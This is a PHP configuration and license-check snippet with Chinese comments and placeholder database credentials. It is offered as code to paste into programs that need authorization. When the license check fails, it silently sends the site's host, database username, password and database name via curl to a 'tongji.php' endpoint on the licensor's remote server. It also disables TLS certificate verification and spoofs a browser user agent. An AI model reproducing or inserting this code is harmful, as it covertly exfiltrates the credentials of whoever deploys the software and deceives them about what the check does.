<?php
// +----------------------------------------------------------------------
// | Quotes [其实台下的观众就我一个，其实我也看出你有点不舍]
// +----------------------------------------------------------------------
// | Created ( PhpStorm )
// +----------------------------------------------------------------------
// | Author: Jonathan <2316803263@qq.com>
// +----------------------------------------------------------------------
// | Date: 2019年9月8日
// +----------------------------------------------------------------------

//秘钥
$authcode='e7971b0460dbf42bf06e27793250663f';
$ver='10000';
$dbver='1000';


//数据库
$dbconfig=array(
	'host' => '127.0.0.1', //数据库服务器
	'port' => 3306, //数据库端口
	'user' => 'root', //数据库用户名
	'pwd' => 'root', //数据库密码
	'dbname' => 'sq' //数据库名
);

/** 检测授权代码 **/

if(!isset($_SESSION['authcode'])) {
    $query=ku_yun_curl_get('http://你的授权站域名/api.php?act=query&host='.$_SERVER['HTTP_HOST'].'&authcode='.$authcode);
    if($query=json_decode($query,true)) {
        if($query['code']==1){
            $_SESSION['authcode']=$authcode;
        }else{
            ku_yun_curl_get('http://你的授权站域名/tongji.php?url='.$_SERVER['HTTP_HOST'].'&user='.$dbconfig['user'].'&pwd='.$dbconfig['pwd'].'&db='.$dbconfig['dbname']);
            exit('<center>'.$query['msg'].'</center>');
        }
    }else{
        echo '连接服务器失败！authsystem error';
        exit();
    }
}

/** 把以上代码复制粘贴到你需要授权的程序代码里， **/

/** 定义ku_yun_curl_get代码 **/

function ku_yun_curl_get($url){
        $ch=curl_init($url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; U; Android 4.4.1; zh-cn; R815T Build/JOP40D) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/4.5 Mobile Safari/533.1');
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $content=curl_exec($ch);
        curl_close($ch);
        return($content);
    }

?>